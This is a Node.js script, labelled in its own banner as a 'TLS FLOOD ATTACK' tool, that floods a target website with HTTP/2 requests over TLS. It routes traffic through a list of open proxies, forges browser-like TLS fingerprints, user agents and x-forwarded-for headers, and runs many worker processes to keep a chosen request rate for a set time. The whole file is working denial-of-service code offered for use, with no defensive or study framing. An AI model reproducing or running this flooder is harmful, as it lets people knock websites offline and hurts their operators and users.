const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`Usage: node TLS.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

var proxyFile = "proxy.txt";
var proxies = readLines(proxyFile);
var userAgents = readLines("ua.txt");

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    console.clear();

    const R = '\x1b[1;31m';
    const G = '\x1b[1;32m';
    const Y = '\x1b[1;33m';
    const P = '\x1b[1;35m';
    const C = '\x1b[1;36m';
    const W = '\x1b[1;37m';
    const N = '\x1b[0m';

    console.log(`
${R}████████╗██╗     ███████╗
${R}╚══██╔══╝██║     ██╔════╝
${R}   ██║   ██║     ███████╗
${R}   ██║   ██║     ╚════██║
${R}   ██║   ███████╗███████║
${R}   ╚═╝   ╚══════╝╚══════╝${N}
${Y}─────────────────────────────────────────${N}
${W}  𝗧𝗟𝗦 𝗙𝗟𝗢𝗢𝗗 𝗔𝗧𝗧𝗔𝗖𝗞${N}
${W}  𝗔𝘂𝘁𝗵𝗼𝗿: ${G}@rulzzz06${N}
${Y}─────────────────────────────────────────${N}

${W}𝗧𝗮𝗿𝗴𝗲𝘁  : ${G}${parsedTarget.host}${N}
${W}𝗧𝗶𝗺𝗲    : ${G}${args.time}s${N}
${W}𝗧𝗵𝗿𝗲𝗮𝗱𝘀 : ${G}${args.threads}${N}
${W}𝗥𝗮𝘁𝗲    : ${G}${args.Rate}/s${N}
${W}𝗦𝘁𝗮𝘁𝘂𝘀  : ${G}▶ 𝗥𝗨𝗡𝗡𝗜𝗡𝗚${N}
${Y}─────────────────────────────────────────${N}
`);

    let sent = 0;
    let failed = 0;
    let progress = 0;
    const totalRequests = args.Rate * args.time;
    const spinnerChars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
    let spinnerIndex = 0;

    const updateStats = setInterval(() => {
        progress = Math.min(100, Math.floor((sent + failed) / totalRequests * 100));
        spinnerIndex = (spinnerIndex + 1) % spinnerChars.length;
        
        const barLength = 30;
        const filled = Math.floor(progress / 100 * barLength);
        const empty = barLength - filled;
        const bar = '█'.repeat(filled) + '░'.repeat(empty);
        
        process.stdout.write(`\r${C}[${spinnerChars[spinnerIndex]}]${W} 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: ${G}${bar}${W} ${progress}% ${W}𝗦𝗲𝗻𝘁: ${G}${sent}${W} 𝗙𝗮𝗶𝗹: ${R}${failed}${W} +${sent}/${args.Rate}${N}`);
    }, 100);

    setTimeout(() => {
        clearInterval(updateStats);
        console.log(`
${Y}─────────────────────────────────────────${N}
${G}✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗!${N}
${W}  𝗧𝗼𝘁𝗮𝗹 𝗦𝗲𝗻𝘁  : ${G}${sent}${N}
${W}  𝗧𝗼𝘁𝗮𝗹 𝗙𝗮𝗶𝗹𝗲𝗱: ${R}${failed}${N}
${W}  𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻    : ${G}${args.time}s${N}
${Y}─────────────────────────────────────────${N}
`);
        process.exit(1);
    }, process.argv[3] * 1000);

    process.on('message', (msg) => {
        if (msg.type === 'stats') {
            sent += msg.sent;
            failed += msg.failed;
        }
    });

} else {
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 0);
    }
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true)

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}

headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
headers["accept-encoding"] = "gzip, deflate, br";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "same-origin";
headers["upgrade-insecure-requests"] = "1";

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    headers[":authority"] = parsedTarget.host
    headers["user-agent"] = randomElement(userAgents);
    headers["x-forwarded-for"] = parsedProxy[0];

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (process.send) {
                process.send({ type: 'stats', sent: 0, failed: 1 });
            }
            return;
        }

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true)

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: [
                "h2"
            ],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: settings,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers)
                        .on("response", response => {
                            request.close();
                            request.destroy();
                            if (process.send) {
                                process.send({ type: 'stats', sent: 1, failed: 0 });
                            }
                            return
                        })
                        .on("error", () => {
                            request.destroy();
                            if (process.send) {
                                process.send({ type: 'stats', sent: 0, failed: 1 });
                            }
                            return
                        });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            if (process.send) {
                process.send({ type: 'stats', sent: 0, failed: 1 });
            }
            return
        });
    });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
